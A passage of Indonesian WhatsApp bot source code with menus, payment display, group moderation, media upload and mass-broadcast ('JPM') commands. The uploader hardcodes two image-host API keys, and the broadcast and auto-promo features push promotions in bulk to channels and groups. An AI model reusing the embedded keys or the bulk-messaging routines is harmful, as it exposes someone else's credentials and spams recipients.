͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
  ╭◙  *Main Menu*
  ┆• .igdownload
  ┆• .removebg
  ┆• .suarateks
  ┆• .emojimix
  ┆• .pinterest
  ┆• .ttsearch
  ┆• .gimage
  ┆• .bratvid
  ┆• .ssweb
  ┆• .ffstalk
  ┆• .tiktok
  ┆• .brat
  ┆• .sfile
  ┆• .play
  ╰◙
  ╭◙  *Tools Media*
  ┆• .tourl
  ╰◙
  ╭◙ 𝗔𝘂𝘁𝗼 𝗠𝗲𝗻𝘂
  ┆•.autojpmswgc
  ┆•.setautoswgc
  ┆• .autojpm
  ┆•.setjpm
  ┆• .autojoingc
  ╰◙
  ╭◙ 𝗝𝗣𝗠 𝗠𝗲𝗻𝘂
  ┆•.jaser
  ┆• .jaserht
  ┆•.jedajaser
  ┆• .jpmswgc
  ┆• .listproduk
  ┆• .addproduk
  ┆• .autopromo
  ┆• .setpromo
  ┆• .payment
  ╰◙
  ╭◙  *Group Menu*
  ┆• .creategc
  ┆• .leavegc
  ┆• .joingc
  ┆• .listgrup
  ┆• .notifgrup
  ┆• .status grup
  ┆• .antilink
  ┆• .welcome
  ┆• .hidetag
  ┆• .kick
  ┆• .add
  ╰◙
  ╭◙  *Owner Menu*
  ┆• .addowner <nomor>
  ┆• .delowner <nomor>
  ┆• .listowner
  ┆• .restart
  ┆• .public
  ┆• .self
  ┆• .backup
  ╰◙`,
  }, { quoted: lampuwarna })
}
break

case "ownermenu": {
  await NXL.sendMessage(m.chat, {
    image: global.gambar1Cache || fs.readFileSync(`./lib/image/image.jpg`),
    caption: `『 👑 *Owner Menu* 👑 』
「 Khusus Pemilik Bot 」
◆━━━━━━━━━━━━━━━━◆

『 ⚙️ Pengaturan Bot 』
◇ .public ◇ .self
◇ .restart ◇ .backup

『 👥 Manajemen Owner 』
◇ .addowner ◇ .delowner
◇ .listowner

『 📢 Broadcast 』
◇ .jpm ◇ .jaser ◇ .jaserht
◇ .jedajaser ◇ .jpmswgc
◇ .jpmch ◇ .autojpm ◇ .setjpm

『 🤖 Auto System 』
◇ .autojpmswgc ◇ .setautoswgc
◇ .stopswgc ◇ .autojoingc
◇ .swgc ◇ .sendstatus

『 👥 Grup 』
◇ .creategc ◇ .leavegc
◇ .joingc ◇ .listgrup
◇ .hidetag ◇ .kick ◇ .add

◆━━━━━━━━━━━━━━━━◆
🌸 *${storename}* 🌸`,
  }, { quoted: lampuwarna })
}
break

case 'qris': {
  if (!global.qris) return m.reply('❌ Qris tidak tersedia')
  if (!global._qrisCache) { try { global._qrisCache = fs.readFileSync(global.qris) } catch { return m.reply('❌ Qris tidak tersedia') } }
  await NXL.sendMessage(m.chat, {
    image: global._qrisCache,
    caption: `╭─「 *QRIS PAYMENT* 」
│
│  Scan QR di atas untuk bayar
│  Support semua aplikasi:
│  GoPay • OVO • DANA • ShopeePay
│  LinkAja • BSI • BCA Mobile
│
│  _Konfirmasi setelah transfer!_
╰─「 *${storename}* 」`,
  }, { quoted: m })
}
break

case 'payment': {
  const qrisPaths = [
    global.qris,
    './lib/image/payment/qris.jpg',
    './lib/image/payment/qris.jpeg',
    './lib/image/payment/qris.png',
  ].filter(Boolean)

  let qrisBuffer = null
  for (const p of qrisPaths) {
    try {
      if (fs.existsSync(p)) { qrisBuffer = fs.readFileSync(p); break }
    } catch {}
  }

  if (!qrisBuffer) {
    return m.reply(
      `╭─「 *💳 ALL PAYMENT* 」\n│\n│  *E-Wallet*\n│  • DANA   : ${dana || '-'}\n│  • GoPay  : ${gopay || '-'}\n│  • OVO    : ${ovo || '-'}\n│\n│  *Rekening Bank*\n│  • ${rek || '-'}\n│\n│  _Konfirmasi transfer ke owner_\n│  📞 ${owner[0] || '-'}\n╰─「 *${storename}* 」`
    )
  }

  try {
    const qrisMedia = await prepareWAMessageMedia(
      { image: qrisBuffer },
      { upload: NXL.waUploadToServer }
    )

    let msg = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              mentionedJid: [m.sender],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: global.idsal || '',
                newsletterName: wm,
                serverMessageId: -1
              },
              businessMessageForwardInfo: {
                businessOwnerJid: NXL.decodeJid(NXL.user.id)
              }
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: `╭─「 *💳 ALL PAYMENT* 」\n│\n│  *E-Wallet*\n│  • DANA   : ${dana || '-'}\n│  • GoPay  : ${gopay || '-'}\n│  • OVO    : ${ovo || '-'}\n│\n│  *Rekening Bank*\n│  • ${rek || '-'}\n│\n│  _Konfirmasi transfer ke owner_\n╰─「 *${storename}* 」`
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: `© ${storename}`
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              title: `💳 Payment — ${storename}`,
              hasMediaAttachment: true,
              ...qrisMedia
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "💬 Hubungi Owner",
                    url: `https://wa.me/${owner[0]?.replace(/[^0-9]/g, "")}`,
                    merchant_url: `https://wa.me/${owner[0]?.replace(/[^0-9]/g, "")}`
                  })
                }
              ]
            })
          })
        }
      }
    }, {})

    await NXL.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id
    })
  } catch (e) {
    console.error("Payment error:", e)
    m.reply(
      `╭─「 *💳 ALL PAYMENT* 」\n│\n│  *E-Wallet*\n│  • DANA   : ${dana || '-'}\n│  • GoPay  : ${gopay || '-'}\n│  • OVO    : ${ovo || '-'}\n│\n│  *Rekening Bank*\n│  • ${rek || '-'}\n│\n│  _Konfirmasi transfer ke owner_\n│  📞 ${owner[0] || '-'}\n╰─「 *${storename}* 」`
    )
  }
}
break

case "cekidch":
case "idch": {
  if (!text) return m.reply(`*Contoh :* ${command} link channel`);
  if (!text.includes("https://whatsapp.com/channel/")) {
    return m.reply("Link channel tidak valid");
  }
  let result = text.split("https://whatsapp.com/channel/")[1];
  let res = await NXL.newsletterMetadata("invite", result);
  let teks = `${res.id}`;
  return m.reply(teks);
}
break;

case 'listgc': case 'cekidgc': {
if (!isCreator) return m.reply(mess.owner);
let getGroups = await NXL.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await NXL.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks)
}
break

case "status": case "statusgrup": {
if (!isCreator) return m.reply(mess.owner);
if (!m.isGroup) return m.reply(mess.group);
const teks = `
- Antilink : ${Antilink.includes(m.chat) ? "✅" : "❌"}
- Antilink2 : ${Antilink2.includes(m.chat) ? "✅" : "❌"}
- Welcome : ${welcome.includes(m.chat) ? "✅" : "❌"}

_✅ = Aktif_
_❌ = Tidak Aktif_
`
return m.reply(teks)
}
break

case "done":
case "don":
case "proses":
case "ps": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text) return m.reply(`*Contoh :* ${command} nama barang`);
  const status = /done|don/.test(command) ? "Transaksi Done ✅" : "Dana Telah Diterima ✅";
  const teks = `${status}

📦 Pembelian: ${text}
🗓️ Tanggal: ${global.tanggal(Date.now())}

📢 Cek Testimoni Pembeli:
${global.linkChannel.split("https://")[1] || "-"}

📣 Gabung Grup Share & Promosi:
${global.linkGrup.split("https://")[1] || "-"}`;
  await NXL.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
    }
  }, { quoted: null });
}
break;

case "tourl": {
  if (!/image|video|audio|application/.test(mime)) return m.reply(`Media tidak ditemukan!\nKetik *${command}* dengan reply/kirim media`)
  try {
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');
    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let { ext } = await fromBuffer(aa);
    let results = [];
    let errors = [];

    if (/image/.test(mime)) {
      try {
        const IMGBB_API_KEY = '849bd793e2106ab250ec9f0956e85cbe';
        let bodyForm1 = new FormData();
        bodyForm1.append("image", aa.toString("base64"));
        let res1 = await axios.post(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, bodyForm1, {
          headers: bodyForm1.getHeaders()
        });
        if (!res1.data.success) throw new Error(res1.data.error?.message || 'Upload gagal');
        results.push({ name: "Top4Top-Uploader", url: res1.data.data.url });
      } catch(e) { errors.push("Top4Top-Uploader: " + e.message) }
    }

    if (/image/.test(mime)) {
      try {
        let bodyForm2 = new FormData();
        bodyForm2.append("source", aa.toString("base64"));
        bodyForm2.append("key", "6d207e02198a847aa98d0a2a901485a5");
        bodyForm2.append("format", "json");
        let res2 = await axios.post("https://freeimage.host/api/1/upload", bodyForm2, {
          headers: bodyForm2.getHeaders()
        });
        if (res2.data.status_code !== 200) throw new Error("Upload gagal");
        results.push({ name: "Qu-Uploader", url: res2.data.image.url });
      } catch(e) { errors.push("Qu-Uploader: " + e.message) }
    }

    try {
      let bodyForm3 = new FormData();
      bodyForm3.append("file", aa, { filename: "file." + ext });
      let res3 = await axios.post("https://tmpfiles.org/api/v1/upload", bodyForm3, {
        headers: bodyForm3.getHeaders()
      });
      let url3 = res3.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");
      results.push({ name: "Uguu-Uploader", url: url3 });
    } catch(e) { errors.push("Uguu-Uploader: " + e.message) }

    try {
      let bodyForm4 = new FormData();
      bodyForm4.append("files[]", aa, { filename: "file." + ext });
      let res4 = await axios.post("https://uguu.se/upload", bodyForm4, {
        headers: bodyForm4.getHeaders()
      });
      let url4 = res4.data.files?.[0]?.url || res4.data[0]?.url;
      if (!url4) throw new Error("URL tidak ditemukan");
      results.push({ name: "Pixhost-Uploader", url: url4 });
    } catch(e) { errors.push("Pixhost-Uploader: " + e.message) }

    if (results.length === 0) throw new Error("Semua uploader gagal:\n" + errors.join("\n"));

    let text = `╭──⊙ *UPLOADER RESULTS*\n`;
    text += `│ 🖇️ *Status :* ✅ Success\n`;
    text += `│ 🖇️ *Total  :* ${results.length} Uploader\n`;
    text += `╰──────────────────\n\n`;
    for (let r of results) {
      text += `🔗 *${r.name}*\n${r.url}\n\n`;
    }

    await m.reply(text.trim());

  } catch(e) { await m.reply('❌ Gagal upload: ' + e.message) }
}
break
case "backupsc":
case "bck":
case "backup": {
  const isCreator = global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
  if (!isCreator && m.sender !== botNumber) return m.reply(mess.owner);

  try {
    await m.reply("⏳ Processing Backup Script...");

    const tmpDir = "./Tmp";
    if (fs.existsSync(tmpDir)) {
      fs.readdirSync(tmpDir)
        .filter(f => !f.endsWith(".js"))
        .forEach(f => {
          try { fs.unlinkSync(`${tmpDir}/${f}`); } catch {}
        });
    }

    const archiver = require("archiver");
    const name = `Script-Backup ${ownername} ${Date.now()}`;
    const zipPath = `./${name}.zip`;
    const exclude = ["node_modules", "Session", "session", "package-lock.json", "yarn.lock", ".npm", ".cache"];

    await new Promise((resolve, reject) => {
      const output = fs.createWriteStream(zipPath);
      const archive = archiver("zip", { zlib: { level: 9 } });

      output.on("close", resolve);
      archive.on("error", reject);
      archive.pipe(output);

      fs.readdirSync(".").filter(f => !exclude.includes(f) && fs.existsSync(f)).forEach(f => {
        const stat = fs.statSync(f);
        if (stat.isDirectory()) {
          archive.directory(f, f);
        } else {
          archive.file(f, { name: f });
        }
      });

      archive.finalize();
    });

    if (!fs.existsSync(zipPath)) return m.reply("❌ Gagal membuat file zip.");

    await NXL.sendMessage(m.sender, {
      document: fs.readFileSync(zipPath),
      fileName: `${name}.zip`,
      mimetype: "application/zip",
      caption: `✅ Backup berhasil!\n📅 ${new Date().toLocaleString('id-ID')}`
    }, { quoted: m });

    fs.unlinkSync(zipPath);

    if (m.chat !== m.sender) await m.reply("✅ Script berhasil dikirim ke private chat!");

  } catch (err) {
    console.error("Backup Error:", err);
    m.reply(`❌ Backup gagal: ${err.message}`);
  }
}
break;

case "add": {
  if (!m.isGroup) return m.reply(mess.group);
  if (!isCreator && !m.isAdmin) return m.reply(mess.admin);
  if (!!isAdmins) return m.reply(mess.botadmin);
  if (!text && !m?.quoted) return m.reply('Masukkan nomor yang ingin ditambahkan')

  let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

  try {
    await NXL.groupParticipantsUpdate(m.chat, [users], 'add')
    return NXL.sendMessage(m.chat, {
      text: `Berhasil menambahkan @${users.split('@')[0]}`,
      mentions: [users]
    }, { quoted: m })
  } catch (e) {
    return m.reply("Gagal add: " + e.message)
  }
}
break

case "kick":
case "kik": {
  if (!m.isGroup) return m.reply(mess.group);
  if (!isCreator && !m.isAdmin) return m.reply(mess.admin);
  if (!!isAdmins) return m.reply(mess.botadmin);

  let target;

  if (m.mentionedJid?.[0]) {
    target = m.mentionedJid[0];
  } else if (m.quoted?.sender) {
    target = m.quoted.sender;
  } else if (text) {
    const cleaned = text.replace(/[^0-9]/g, "");
    if (cleaned) target = cleaned + "@s.whatsapp.net";
  }

  if (!target) return m.reply(`*Contoh :* .kick @tag/6283XXX`);

  try {
    await NXL.groupParticipantsUpdate(m.chat, [target], "remove");
    return NXL.sendMessage(m.chat, {
      text: `✅ Berhasil mengeluarkan @${target.split("@")[0]}`,
      mentions: [target]
    }, { quoted: m });
  } catch (err) {
    console.error("Kick error:", err);
    return m.reply("Gagal mengeluarkan anggota. Coba lagi atau cek hak akses bot.");
  }
}
break;

case "closegc":
case "close":
case "opengc":
case "open": {
  if (!m.isGroup) return m.reply(mess.group);
  if (!isCreator && !m.isAdmin) return m.reply(mess.admin);
  if (!!isAdmins) return m.reply(mess.botadmin);

  try {
    if (command === "open" || command === "opengc") {
      await NXL.groupSettingUpdate(m.chat, 'not_announcement');
      return m.reply("Grup berhasil dibuka! Sekarang semua anggota dapat mengirim pesan.");
    }

    if (command === "close" || command === "closegc") {
      await NXL.groupSettingUpdate(m.chat, 'announcement');
      return m.reply("Grup berhasil ditutup! Sekarang hanya admin yang dapat mengirim pesan.");
    }
  } catch (error) {
    console.error("Error updating group settings:", error);
    return m.reply("Terjadi kesalahan saat mencoba mengubah pengaturan grup.");
  }
}
break;

case "ht":
case "hidetag": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator) return m.reply(mess.owner);
    if (!q) return m.reply(`*Contoh :* ${command} pesannya`);
    NXL.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:lampuwarna})
}
break

case "welcome": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`*Contoh :* ${command} on/off`);
    if (!/on|off/.test(text)) return m.reply(`*contoh:* ${command} on/off`);

    if (/on/.test(text)) {
        if (welcome.includes(m.chat))
            return m.reply("Welcome di grup ini sudah aktif ✅");

        welcome.push(m.chat);
        await fs.writeFileSync("./database/welcome.json", JSON.stringify(welcome, null, 2));
        return m.reply("Berhasil menyalakan welcome di grup ini ✅");
    }

    if (/off/.test(text)) {
        if (!welcome.includes(m.chat))
            return m.reply("Welcome di grup ini sudah tidak aktif ❌");

        const inde = welcome.indexOf(m.chat);
        welcome.splice(inde, 1);
        await fs.writeFileSync("./database/welcome.json", JSON.stringify(welcome, null, 2));
        return m.reply("Berhasil mematikan welcome di grup ini ✅");
    }
}
break;

case "antilink": {
    if (!isCreator) return m.reply(mess.owner)
    if (!m.isGroup) return m.reply(mess.group);
    if (!text) return m.reply(`*Contoh :* ${command} on/off`);

    const isAntilink = Antilink.includes(m.chat);
    const isAntilink2 = Antilink2.includes(m.chat);

    if (text === "on") {
        if (isAntilink) return m.reply(`Antilink di grup ini sudah aktif!`);
        if (isAntilink2) {
            const posisi = Antilink2.indexOf(m.chat);
            if (posisi !== -1) Antilink2.splice(posisi, 1);
            await fs.writeFileSync("./database/antilink2.json", JSON.stringify(Antilink2, null, 2));
        }
        Antilink.push(m.chat);
        await fs.writeFileSync("./database/antilink.json", JSON.stringify(Antilink, null, 2));
        return m.reply(`Berhasil menyalakan antilink di grup ini ✅`);
    }

    if (text === "off") {
        if (!isAntilink) return m.reply(`Antilink di grup ini sudah tidak aktif!`);
        const posisi = Antilink.indexOf(m.chat);
        if (posisi !== -1) Antilink.splice(posisi, 1);
        await fs.writeFileSync("./database/antilink.json", JSON.stringify(Antilink, null, 2));
        return m.reply(`Berhasil mematikan antilink di grup ini ✅`);
    }
}
break;

case "antilink2": {
    if (!isCreator) return m.reply(mess.owner);
    if (!m.isGroup) return m.reply(mess.group);
    if (!text) return m.reply(`*Contoh :* ${command} on/off`);

    const isAntilink = Antilink.includes(m.chat);
    const isAntilink2 = Antilink2.includes(m.chat);

    if (text === "on") {
        if (isAntilink2) return m.reply(`Antilink2 di grup ini sudah aktif!`);
        if (isAntilink) {
            const posisi = Antilink.indexOf(m.chat);
            if (posisi !== -1) Antilink.splice(posisi, 1);
            await fs.writeFileSync("./database/antilink.json", JSON.stringify(Antilink, null, 2));
        }
        Antilink2.push(m.chat);
        await fs.writeFileSync("./database/antilink2.json", JSON.stringify(Antilink2, null, 2));
        return m.reply(`Berhasil menyalakan antilink2 di grup ini ✅`);
    }

    if (text === "off") {
        if (!isAntilink2) return m.reply(`Antilink2 di grup ini sudah tidak aktif!`);
        const posisi = Antilink2.indexOf(m.chat);
        if (posisi !== -1) Antilink2.splice(posisi, 1);
        await fs.writeFileSync("./database/antilink2.json", JSON.stringify(Antilink2, null, 2));
        return m.reply(`Berhasil mematikan antilink2 di grup ini ✅`);
    }
}
break;

case "jpmch": {
  if (!isCreator) return m.reply(mess.owner)
  if (global.statusjpm) return m.reply(`⚠️ JPM sedang berjalan, tunggu sampai selesai!`)
  if (!global.botReady) return m.reply(`⏳ Bot baru saja reconnect, harap tunggu 20 detik lalu coba lagi.`)
  if (!text) return m.reply(`*Contoh :* ${command} pesannya & bisa dengan foto juga`)

  let mediaPath
  if (/image/.test(mime)) {
    mediaPath = await NXL.downloadAndSaveMediaMessage(qmsg)
  }

  const all = [...(global.store?.chats?.array || [])]
  const channelList = all.filter(c => c.id?.endsWith("@newsletter")).map(c => c.id)
  if (channelList.length < 1) {
    if (mediaPath && fs.existsSync(mediaPath)) fs.unlinkSync(mediaPath)
    return m.reply("❌ Tidak ada channel ditemukan")
  }

  const jenis = mediaPath ? "teks & foto" : "teks"
  const senderChat = m.chat
  const messageContent = mediaPath
    ? { image: fs.readFileSync(mediaPath), caption: text }
    : { text }

  global.messageJpm = messageContent
  global.statusjpm = true

  await m.reply(`⏳ Memproses JPM ${jenis} ke *${channelList.length}* Channel...`)

  let successCount = 0

  for (let chIdx = 0; chIdx < channelList.length; chIdx++) {
    const chId = channelList[chIdx]
    if (global.stopjpm) {
      delete global.stopjpm
      break
    }
    try {
      await NXL.sendMessage(chId, global.messageJpm)
      successCount++
    } catch {
    }
    if (chIdx < channelList.length - 1) {
      await new Promise(r => setTimeout(r, global.JedaJpm || 5000))
